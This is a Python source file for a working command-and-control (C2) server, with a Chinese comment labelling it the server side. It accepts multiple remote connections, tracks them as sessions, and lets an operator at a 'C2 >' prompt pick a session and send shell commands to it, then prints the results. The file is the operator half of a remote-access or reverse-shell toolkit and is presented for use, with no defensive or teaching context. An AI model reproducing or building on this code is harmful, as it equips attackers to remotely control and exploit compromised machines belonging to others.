#服务端
import socket
import threading
import os
import select

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.current_session = None
        self.session_counter = 0

    def add_session(self, conn, addr):
        with self.lock:
            self.session_counter += 1
            self.sessions[self.session_counter] = (conn, addr)
            return self.session_counter

    def remove_session(self, session_id):
        with self.lock:
            if session_id in self.sessions:
                del self.sessions[session_id]
                if self.current_session == session_id:
                    self.current_session = None

manager = SessionManager()

def handle_client(conn, addr):
    session_id = manager.add_session(conn, addr)
    print(f"[*] Session {session_id} ({addr[0]}:{addr[1]}) connected")
    try:
        while True:
            ready, _, _ = select.select([conn], [], [], 30)
            if ready:
                data = b''
                while True:
                    chunk = conn.recv(4096)
                    if not chunk: 
                        break
                    data += chunk
                    if len(chunk) < 4096:
                        break
                
                if data.decode() == "heartbeat":
                    conn.send(b"alive")
                    continue
                
                print(f"\n[Session {session_id}] Output:\n{data.decode('utf-8', errors='replace')}")
                
    except Exception as e:
        print(f"[!] Session {session_id} error: {str(e)}")
    finally:
        manager.remove_session(session_id)
        conn.close()

def command_handler():
    while True:
        cmd = input("\nC2 > ").strip()
        if not cmd:
            continue
            
        if cmd == "sessions":
            print("\nActive Sessions:")
            for sid, (conn, addr) in manager.sessions.items():
                print(f"  {sid} - {addr[0]}:{addr[1]}")
        elif cmd.startswith("select "):
            try:
                session_id = int(cmd.split()[1])
                if session_id in manager.sessions:
                    manager.current_session = session_id
                    print(f"[*] Selected session {session_id}")
                else:
                    print("[!] Invalid session ID")
            except:
                print("Usage: select <session_id>")
        elif cmd == "exit":
            os._exit(0)
        elif manager.current_session:
            try:
                conn = manager.sessions[manager.current_session][0]
                conn.send(cmd.encode("utf8"))
            except BrokenPipeError:
                print(f"[!] Session {manager.current_session} 连接已断开")
                manager.remove_session(manager.current_session)
        else:
            print("[!] 请先选择活动会话 (使用'sessions'和'select')")

def start_server(lhost, lport):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((lhost, lport))
    server.listen(5)
    
    print(f"[*] C2 server listening on {lhost}:{lport}")
    
    cmd_thread = threading.Thread(target=command_handler)
    cmd_thread.daemon = True
    cmd_thread.start()
    
    while True:
        conn, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.daemon = True
        client_thread.start()

if __name__ == "__main__":
    start_server("0.0.0.0", 9999)
